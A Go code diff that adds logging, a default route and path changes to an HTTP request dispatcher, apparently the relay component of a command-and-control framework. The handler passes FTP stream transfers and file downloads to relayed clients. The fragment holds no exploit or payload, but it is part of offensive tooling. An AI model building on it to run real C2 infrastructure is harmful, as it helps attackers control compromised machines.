@@ -27,28 +27,38 @@ func RelayHTTP2Server() {
 	}
 }
 
-func dispatcher(w http.ResponseWriter, r *http.Request) {
-	api := mux.Vars(r)["api"]
-	token := mux.Vars(r)["token"]
+func dispatcher(wrt http.ResponseWriter, req *http.Request) {
+	logging.Debugf("Relayed request: %s %s", req.Method, req.URL.Path)
+	logging.Debugf("Relayed request headers: %v", req.Header)
+	api := mux.Vars(req)["api"]
+	token := mux.Vars(req)["token"]
+	logging.Debugf("Got relayed request from C2: API: %s, token: %s", api, token)
 
+	// match API names
+	api = transport.WebRoot + "/" + api
 	switch api {
 	case transport.GetAPI:
 		for _, sh := range network.FTPStreams {
 			if token == sh.Token {
-				handleFTPTransfer(sh, w, r)
+				handleFTPTransfer(sh, wrt, req)
 				return
 			}
 		}
-		w.WriteHeader(http.StatusNotFound)
+		logging.Debugf("FTP stream not found: %s", token)
+		wrt.WriteHeader(http.StatusNotFound)
 	case transport.PutAPI:
-		path := filepath.Clean(r.URL.Query().Get("file_to_download"))
+		path := filepath.Clean(req.URL.Query().Get("file_to_download"))
 		path = filepath.Base(path)
-		logging.Debugf("FileAPI request for file: %s, URL: %s", path, r.URL)
-		local_path := fmt.Sprintf("%s/%s/%s", live.Temp, transport.WWW, path)
+		logging.Infof("PUT: got request for file: %s, URL: %s", path, req.URL)
+		local_path := fmt.Sprintf("%s%s", live.WWWRoot, path)
 		if !util.IsExist(local_path) {
-			w.WriteHeader(http.StatusNotFound)
+			logging.Warningf("File %s not found", local_path)
+			wrt.WriteHeader(http.StatusNotFound)
 			return
 		}
-		http.ServeFile(w, r, local_path)
+		http.ServeFile(wrt, req, local_path)
+	default:
+		logging.Debugf("API not found: %s", api)
+		wrt.WriteHeader(http.StatusNotFound)
 	}
 }
